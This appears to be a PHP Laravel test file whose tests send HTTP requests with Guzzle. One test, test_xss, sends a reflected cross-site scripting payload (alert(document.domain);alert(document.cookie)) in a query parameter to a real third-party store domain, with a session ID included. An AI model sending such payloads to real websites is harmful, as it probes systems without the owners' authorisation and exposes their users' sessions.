<?php

namespace Tests\Feature;

use App\Services\CsvService;
use App\Services\I18nService;
use Exception;
use GuzzleHttp\Client;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Storage;
use Mockery;
use Tests\TestCase;

class SpiderTest extends TestCase
{
    public function test_post()
    {
        $url = "http://172.29.116.216/test";
        $client = new Client();
        $response = $client->request('POST', $url, [
            'form_params' => [
                "name" => "name",
            ]
        ]);
        $code = $response->getStatusCode();
        echo "<pre>code = " . print_r($code, true) . "</pre>\n";
        $response_text = $response->getBody()->getContents();
        echo "<pre>response_text = " . print_r($response_text, true) . "</pre>\n";
        $this->assertIsInt($code);
    }

    public function test_xss()
    {
        $url = "https://local-software.qnap.com/stores/store/switch/?SID=q6mikop5hl794jju2l0vv8jg41&___from_store=zh_tw&___store=en_usuwu%27;alert(document.domain);alert(document.cookie);//";
        $client = new Client();
        $response = $client->request('GET', $url, []);
        $code = $response->getStatusCode();
        echo "<pre>code = " . print_r($code, true) . "</pre>\n";
        $response_text = $response->getBody()->getContents();
        echo "<pre>response_text = " . print_r($response_text, true) . "</pre>\n";
        $this->assertIsInt($code);
    }

    public function test_xss2()
    {
        $url = "https://local-software.qnap.com/";
        $client = new Client();
        $response = $client->request('GET', $url, []);
        $code = $response->getStatusCode();
        echo "<pre>code = " . print_r($code, true) . "</pre>\n";
        $response_text = $response->getBody()->getContents();
        echo "<pre>response_text = " . print_r($response_text, true) . "</pre>\n";
        $this->assertIsInt($code);
    }
}
